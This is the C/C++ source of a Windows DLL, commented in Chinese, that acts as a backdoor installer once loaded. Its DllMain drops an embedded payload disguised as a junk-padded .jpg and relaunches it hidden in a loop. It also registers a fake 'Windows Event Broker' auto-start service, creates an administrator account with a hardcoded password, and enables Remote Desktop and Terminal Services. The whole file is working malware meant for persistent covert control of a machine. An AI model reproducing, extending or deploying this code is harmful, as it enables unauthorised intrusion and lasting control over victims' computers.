#include "main.h"
#include "res_decode.h"
#include "backdoor.h"

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include <lm.h>

int out_backdoor(char *wrDir, char *pWrPath)
{
    char bdPath[MAX_PATH];
    FILE *bdFile = NULL;
    ENC_RES_DESC resDesc;
    int idx = 0;
    char paddBuf[] = {0x00};
    int paddSize = 1024 * 1024 * 51;    //填充51Mb垃圾数据

    memset(bdPath, 0x00, sizeof(bdPath));
    memset(&resDesc, 0x00, sizeof(resDesc));

    resDesc = get_backdoor();
    if(resDesc.status != 0)
    {
        return -1;
    }

    sprintf(bdPath, "%s\\%d.jpg", wrDir, time(NULL));
    bdFile = fopen(bdPath, "wb");
    if(bdFile == NULL)
    {
        free(resDesc.pBufAddr);
        return -2;
    }
    if(fwrite(resDesc.pBufAddr, sizeof(char), resDesc.bufSize, bdFile) <= 0)
    {
        free(resDesc.pBufAddr);
        fclose(bdFile);
        return -3;
    }
    for(idx = 1; idx <= paddSize; ++idx)
    {
        paddBuf[0] = idx % 255;
        fwrite(paddBuf, sizeof(char), 1, bdFile);
    }
    fclose(bdFile);
    free(resDesc.pBufAddr);
    strcat(pWrPath, bdPath);

    return 0;
}

int DLL_EXPORT start_backdoor()
{
    char tmpDir[MAX_PATH];
    char *pTmpDir = NULL;
    char bdPath[MAX_PATH];
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    int exitCode = 0;

    memset(tmpDir, 0x00, sizeof(tmpDir));
    memset(bdPath, 0x00, sizeof(bdPath));
    memset(&si, 0x00, sizeof(si));
    memset(&pi, 0x00, sizeof(pi));

    pTmpDir = getenv("TEMP");
    if(pTmpDir != NULL)
    {
        strcat(tmpDir, pTmpDir);
    }
    else
    {
        strcat(tmpDir, "C:\\Windows\\Temp");
    }

    if(out_backdoor(tmpDir, bdPath) != 0)
        return -1;

    //启动释放的后门
    GetStartupInfo(&si);
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcess(NULL, (LPSTR)bdPath, NULL, NULL, 0, NULL, NULL, NULL, &si, &pi);

    while(1)
    {
        Sleep(1000);
        //检查子进程是否退出
        GetExitCodeProcess(pi.hProcess, (PDWORD)&exitCode);
        //子进程已退出
        if(exitCode != STILL_ACTIVE)
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            remove(bdPath);
            break;
        }
    }

    return 0;
}

int create_service()
{
    SC_HANDLE hManage = NULL;
    SC_HANDLE hServ = NULL;
    SERVICE_STATUS currStat;
    SERVICE_STATUS ctrlStat;
    char sysDir[MAX_PATH];
    char bdPath[MAX_PATH];
    char cmdline[MAX_PATH + 50];

    memset(&currStat, 0x00, sizeof(currStat));
    memset(&ctrlStat, 0x00, sizeof(ctrlStat));
    memset(sysDir, 0x00, sizeof(MAX_PATH));
    memset(bdPath, 0x00, sizeof(bdPath));
    memset(cmdline, 0x00, sizeof(cmdline));

    if(GetWindowsDirectory(sysDir, sizeof(sysDir) - 1) == 0)
    {
        memset(sysDir, 0x00, sizeof(sysDir));
        strcat(sysDir, "C:\\Windows");
    }
    if(out_backdoor(sysDir, bdPath) != 0)
        return -1;

    hManage = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if(hManage == NULL)
        return -1;

    hServ = OpenService(hManage, "Windows Event Broker", SERVICE_ALL_ACCESS);
    if(hServ != NULL)
    {
        if(QueryServiceStatus(hServ, &currStat))
        {
            if(currStat.dwCurrentState != SERVICE_STOPPED)
            {
                //关闭服务
                ControlService(hServ, SERVICE_CONTROL_STOP, &ctrlStat);
            }
            //删除原本存在的服务
            DeleteService(hServ);
        }
        //关闭服务句柄
        CloseServiceHandle(hServ);
    }

    //创建新服务
    sprintf(cmdline, "cmd.exe /c start %s -n", bdPath);
    hServ = CreateService(hManage,
                          "Windows Event Broker",
                          "Windows Event Broker",
                          SERVICE_ALL_ACCESS,
                          SERVICE_WIN32_OWN_PROCESS,
                          SERVICE_AUTO_START,
                          SERVICE_ERROR_IGNORE,
                          cmdline,
                          NULL,
                          NULL,
                          NULL,
                          NULL,
                          NULL);
    if(hServ != NULL)
    {
        CloseServiceHandle(hServ);
    }
    CloseServiceHandle(hManage);

    return 0;
}

int user_add()
{
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_3 account;
    NET_API_STATUS ret;
    NET_API_STATUS Status;

    memset(&ui, 0, sizeof(ui));
    memset(&account, 0, sizeof(account));

    ui.usri1_name = L"Support";                   //UserName
    ui.usri1_password = L"Supp4777660!@#";        //PassWord
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;

    ret = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if(ret != NERR_Success)
    {
        return -1;
    }

    account.lgrmi3_domainandname = L"Support";
    Status = NetLocalGroupAddMembers(NULL, L"Administrators",  3, (LPBYTE)&account, 1);
    if(Status != NERR_Success)
    {
        return -2;
    }

    return 0;
}

int set_regedit()
{
    HKEY hKey = NULL;
    char keyData[300];

    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
                    0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
    {
        return -1;
    }

    memset(keyData, 0x00, sizeof(keyData));
    RegSetValueEx(hKey, "fDenyTSConnections", 0, REG_DWORD, (BYTE *)keyData, sizeof(DWORD));

    RegCloseKey(hKey);

    return 0;
}

int start_term_serv()
{
    SC_HANDLE hManage = NULL;
    SC_HANDLE hServ = NULL;
    SERVICE_STATUS currStat;
    SERVICE_STATUS ctrlStat;
    LPQUERY_SERVICE_CONFIG pCurrConf;
    DWORD len = 0;

    hManage = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if(hManage == NULL)
        return -1;

    hServ = OpenService(hManage, "TermService", SERVICE_ALL_ACCESS);
    if(hServ == NULL)
    {
        return -2;
    }

    pCurrConf = (LPQUERY_SERVICE_CONFIG)malloc(4096);
    if(pCurrConf == NULL)
        return -3;
    memset(pCurrConf, 0x00, 4096);
    if(QueryServiceConfig(hServ, pCurrConf, 4096, &len))
    {
        //查询服务配置
        if(pCurrConf->dwStartType != SERVICE_AUTO_START)
        {
            //更改服务为自动启动
            ChangeServiceConfig(hServ,
                                SERVICE_NO_CHANGE,
                                SERVICE_AUTO_START,
                                SERVICE_NO_CHANGE,
                                NULL,
                                NULL,
                                NULL,
                                NULL,
                                NULL,
                                NULL,
                                NULL);
        }
    }

    if(QueryServiceStatus(hServ, &currStat))
    {
        //查询服务当前状态
        if(currStat.dwCurrentState != SERVICE_RUNNING)
        {
            //开启服务
            StartService(hServ, NULL, NULL);
        }
    }
    //关闭服务句柄
    CloseServiceHandle(hServ);
    CloseServiceHandle(hManage);
    free(pCurrConf);

    return 0;
}

void DLL_EXPORT empty()
{
    return;
}

extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // attach to process
        // return FALSE to fail DLL load
        create_service();
        user_add();
        start_term_serv();
        set_regedit();
        while(1)
        {
            start_backdoor();
            Sleep(3000);
        }
        break;

    case DLL_PROCESS_DETACH:
        // detach from process
        break;

    case DLL_THREAD_ATTACH:
        // attach to thread
        break;

    case DLL_THREAD_DETACH:
        // detach from thread
        break;
    }
    return TRUE; // succesful
}
